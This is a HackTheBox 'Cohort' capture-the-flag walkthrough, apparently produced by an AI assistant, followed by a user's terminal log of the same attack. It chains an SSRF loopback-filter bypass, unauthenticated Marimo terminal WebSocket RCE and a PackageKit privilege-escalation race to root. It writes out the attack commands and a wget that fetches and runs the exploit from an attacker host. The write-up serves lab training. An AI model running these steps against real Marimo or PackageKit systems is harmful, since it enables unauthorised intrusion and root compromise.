

# HTB Cohort — reconstructed walkthrough

## 1. Reconnaissance

Start with a full TCP scan:

```bash
nmap -p- --min-rate 5000 <TARGET_IP>
```

The important ports are:

```text
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
```

Service enumeration:

```bash
nmap -sC -sV -p22,80,443 <TARGET_IP>
```

HTTP redirects to:

```text
https://cohort.htb/
```

So add:

```bash
echo "<TARGET_IP> cohort.htb" | sudo tee -a /etc/hosts
```

The TLS certificate is interesting because it includes:

```text
cohort.htb
*.cohort.htb
```

That wildcard certificate becomes important later because there is indeed a hidden virtual host. ([GitHub][1])

---

# 2. Web enumeration

The main site is a client-side application/SPA. One of the important discoveries is:

```text
/portal.html
```

The portal contains a **report/source URL** functionality. Essentially, the application asks the server to fetch a URL on the user's behalf.

That immediately suggests an **SSRF** attack surface.

The JavaScript bundle can be retrieved with something along the lines of:

```bash
curl -ks https://cohort.htb/assets/app.js -o app.js
```

API enumeration also reveals endpoints including:

```text
/api
/api/health
/api/experiments
/api/experiments/configurations
/status
```

Interestingly, `/status` is not directly accessible:

```text
403 Forbidden
```

That becomes important because the application itself can potentially be made to request it. ([GitHub][1])

---

# 3. Discovering the SSRF

The interesting API endpoint is:

```text
POST /api/validate
```

For example:

```bash
curl -k -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1/","format":"json"}'
```

The application rejects obvious loopback addresses such as:

```text
127.0.0.1
localhost
```

So there is a URL validation mechanism.

The problem is that the validation is based on **string representations**, rather than robustly resolving and validating the actual destination address.

Several equivalent loopback representations can therefore bypass such a filter. Public walkthroughs document examples such as:

```text
127.1
0.0.0.0
2130706433
0177.0.0.1
0
```

The particularly useful one in this box is:

```text
127.1
```

Thus:

```bash
curl -k -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.1/status","format":"json"}'
```

The request is now made **by the Cohort server itself**, allowing access to resources restricted to localhost. ([GitHub][1])

---

# 4. Internal port discovery

Once SSRF is established, you can use it as an internal port scanner.

The important discoveries are:

| Port | Service                  |
| ---: | ------------------------ |
| 5000 | Internal application/API |
| 8888 | Marimo notebook          |

The critical one is **8888**.

The service is not directly exposed externally, but the SSRF allows the attacker to reach it through the vulnerable application. ([Medium][2])

---

# 5. The `/status` endpoint reveals the hidden vhost

This is one of the most important steps in the entire machine.

The externally inaccessible:

```text
/status
```

endpoint can be reached through SSRF.

Its response discloses internal nginx routing information.

Among the information revealed is:

```text
nb-1be3782a8afd3ad5.cohort.htb
```

and the backend:

```text
127.0.0.1:8888
```

In other words:

```text
Internet
   │
   ▼
cohort.htb
   │
   ▼
SSRF
   │
   ▼
localhost / nginx
   │
   ▼
nb-1be3782a8afd3ad5.cohort.htb
   │
   ▼
127.0.0.1:8888
   │
   ▼
Marimo
```

This is also the part of the original InfoSec Writeups article that search indexing exposes particularly well. The article describes manually interacting with the TLS/WebSocket layer because ordinary WebSocket tooling had problems with the reverse-proxy/TLS arrangement. ([Feedly][3])

Add the vhost:

```bash
echo "<TARGET_IP> nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
```

Then:

```bash
curl -k https://nb-1be3782a8afd3ad5.cohort.htb/
```

---

# 6. Identifying Marimo

The internal application is **Marimo**, a Python notebook environment.

The version is:

```text
0.20.4
```

That version is significant because Marimo versions before **0.23.0** are affected by:

**CVE-2026-39987 — Marimo pre-authentication RCE.**

The vulnerable endpoint is:

```text
/terminal/ws
```

The underlying problem is particularly interesting: other WebSocket functionality performs authentication validation, but the terminal WebSocket does not properly enforce authentication. Consequently, an unauthenticated client can obtain a PTY. ([Feedly][3])

The vulnerability is rated critical, and the published fix is Marimo **0.23.0**. ([Feedly][3])

---

# 7. Marimo → initial shell

The target WebSocket is:

```text
wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
```

A simple client can establish the WebSocket and issue terminal commands.

One public walkthrough demonstrates the concept with:

```bash
wscat -n -c \
  wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws \
  -x $'id\n'
```

The response identifies the account:

```text
uid=1000(marimo)
gid=1000(marimo)
groups=1000(marimo)
```

So the attack chain has now reached:

```text
SSRF
 ↓
hidden vhost
 ↓
Marimo 0.20.4
 ↓
CVE-2026-39987
 ↓
unauthenticated terminal
 ↓
marimo user
```

([GitHub][1])

### Why the original walkthrough used a custom WebSocket client

This is an important piece from the article you originally asked about.

The author found that ordinary Python WebSocket libraries were unreliable when interacting with the service through the HTTPS reverse proxy.

Consequently, they constructed the connection manually:

```text
TCP connection
     ↓
TLS handshake
     ↓
HTTP WebSocket upgrade
     ↓
WebSocket frames
     ↓
Marimo terminal
```

The custom client manually handles:

* TLS
* HTTP Upgrade
* WebSocket masking
* WebSocket frame parsing
* command transmission

That is why the article's walkthrough appears considerably more complicated at this stage than simply "connect to `/terminal/ws`." ([Medium][2])

---

# 8. User flag

Once command execution is obtained as `marimo`, the user flag is located at:

```bash
cat /home/marimo/user.txt
```

One public write-up records the resulting user flag as:

```text
d48d8dc97c738c120364163fbf7aeea3
```

([Malloc][4])

---

# 9. Local enumeration

Now the problem changes from **web exploitation** to **Linux privilege escalation**.

First check the obvious routes:

```bash
id
sudo -l
```

Then:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Capabilities:

```bash
getcap -r / 2>/dev/null
```

Timers:

```bash
systemctl list-timers --all
```

These don't provide the intended route to root. ([Malloc][4])

The interesting discovery comes from examining **PackageKit**.

---

# 10. PackageKit discovery

Check the installed version:

```bash
dpkg-query -W packagekit packagekit-tools
```

The vulnerable installation is:

```text
packagekit 1.2.8-2ubuntu1.2
packagekit-tools 1.2.8-2ubuntu1.2
```

You can also check:

```bash
pkcon --version
```

which reports:

```text
1.2.8
```

This is important because the machine is vulnerable to:

**CVE-2026-41651 — Pack2TheRoot**

The fixed Ubuntu revision is later than the one installed on Cohort. ([Malloc][4])

---

# 11. Pack2TheRoot / CVE-2026-41651

This is the second major vulnerability in the box.

The vulnerability is a **TOCTOU race condition in PackageKit's D-Bus transaction handling**.

Conceptually:

```text
Unprivileged user
       │
       ▼
PackageKit transaction
       │
       ├── initially marked as SAFE/SIMULATE
       │
       ├── authorization/state processing
       │
       └── transaction data changes
                    │
                    ▼
             malicious package
                    │
                    ▼
              root installation
```

The crucial flaw is that the transaction's state/data can change between the point at which it is considered safe and the point at which the backend actually performs the operation.

The public research/write-up describes two asynchronous `InstallFiles` operations:

```text
1. SIMULATE
2. NONE + malicious package
```

The resulting state confusion permits the malicious package to be installed with root privileges. ([Malloc][4])

---

# 12. Exploiting PackageKit

A public PoC exists for:

```text
CVE-2026-41651
```

The HTB walkthroughs identify the relevant public PoC as the **Vozec Pack2TheRoot** implementation. ([GitHub][1])

The PoC ultimately creates a root-owned SUID Bash at:

```text
/tmp/.suid_bash
```

A successful run results in something equivalent to:

```text
SUCCESS — SUID bash
```

The interesting thing is that an authentication error can actually appear during the exploit and **does not necessarily mean failure**. The vulnerable transaction has already progressed by the time the authorization decision arrives. ([Malloc][4])

---

# 13. Root

Once the SUID Bash exists:

```bash
/tmp/.suid_bash -p
```

Then:

```bash
id
whoami
```

The important distinction is:

```text
uid=1000(marimo)
euid=0(root)
```

The `-p` option preserves Bash's effective UID.

Then:

```bash
cat /root/root.txt
```

The public reconstruction records the root flag as:

```text
71955e1355f28a8ca7b44da40d2af893
```

([Malloc][4])

---

# Complete attack chain

The entire Cohort machine can therefore be understood as:

```text
                 EXTERNAL
                    │
                    ▼
             cohort.htb :443
                    │
                    ▼
              /portal.html
                    │
                    ▼
              /api/validate
                    │
                    ▼
              SSRF / URL filter
                    │
              127.1 bypass
                    │
                    ▼
              localhost nginx
                    │
                    ▼
                 /status
                    │
                    ▼
      nb-1be3782a8afd3ad5.cohort.htb
                    │
                    ▼
             127.0.0.1:8888
                    │
                    ▼
             Marimo 0.20.4
                    │
                    ▼
        /terminal/ws WebSocket
                    │
                    ▼
        CVE-2026-39987
                    │
                    ▼
              marimo shell
                    │
                    ▼
        PackageKit 1.2.8-2ubuntu1.2
                    │
                    ▼
        CVE-2026-41651
         Pack2TheRoot
                    │
                    ▼
             SUID bash
                    │
                    ▼
                  ROOT
```

This overall chain is independently corroborated by multiple public write-ups. ([GitHub][1])

### What the original InfoSec Writeups article adds

The article you originally linked appears to have gone into **more detail than the shorter walkthroughs at exactly two points**:

* the **SSRF → nginx status → hidden vhost** discovery, including the custom handling needed to retrieve the internal routing information;
* the **Marimo WebSocket exploitation**, where a raw socket/TLS implementation was used because normal Python WebSocket clients were unreliable through the reverse proxy. ([Feedly][3])

The privilege-escalation portion is independently recoverable from the other public write-ups, including the exact PackageKit version and the mechanics of the Pack2TheRoot race. ([Malloc][4])

If you're actually working through the box, the **most useful next step is the Marimo section**: I can reconstruct the raw WebSocket exploit used in the original article and explain each part of the Python script so you understand why the ordinary `wscat` approach may fail through the Cohort reverse proxy.

[1]: https://github.com/kartik-Int/Hack-The-Box/blob/main/cohort.md?utm_source=chatgpt.com "Hack-The-Box/cohort.md at main · kartik-Int/Hack-The-Box · GitHub"
[2]: https://medium.com/%40bitr1ft/cohort-on-hackthebox-by-bitr1ft-898eeea37858?utm_source=chatgpt.com "Medium"
[3]: https://feedly.com/cve/CVE-2026-39987?utm_source=chatgpt.com "CVE-2026-39987 - Exploits & Severity - Feedly"
[4]: https://malloc.com.br/writeup/htb-cohort-the-denial-arrived-late/?utm_source=chatgpt.com "HTB Cohort: The Denial Arrived Late — Malloc"

──(ajp㉿kali)-[~/codeplay/htb]
└─$ wscat -n -c \
  wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws \
  -x $'cat /home/marimo/user.txt\n'
marimo@cohort:~$ 
cat /home/marimo/user.txt

8d0371c3a15af4e12ad67afb1049f54b
marimo@cohort:~$ 
                     
─(ajp㉿kali)-[~/codeplay/htb]
└─$ wscat -n -c wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws -x $'cd /tmp && wget http://10.10.15.149:8000/cve-2026-41651 -q && chmod +x cve-2026-41651 && nohup ./cve-2026-41651 > /tmp/run.log 2>&1 &\n'
marimo@cohort:~$ 
cd /tmp && wget http://10.10.15.149:8000/cve-2026-41651 -q && chmod +x cve-2026-41651 && nohup ./cve-2026-41651 > /tmp/run.log 2>&1 &

[1] 2315
marimo@cohort:~$ 
                                                                                                                        
┌──(ajp㉿kali)-[~/codeplay/htb]
└─$ wscat -n -c wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws -x $'/tmp/.suid_bash -p -c "cat /root/root.txt"\n'
marimo@cohort:~$ 
/tmp/.suid_bash -p -c "cat /root/root.txt"

31599dcc18a3438aa2da80d9b1c1699a

marimo@cohort:~$ 
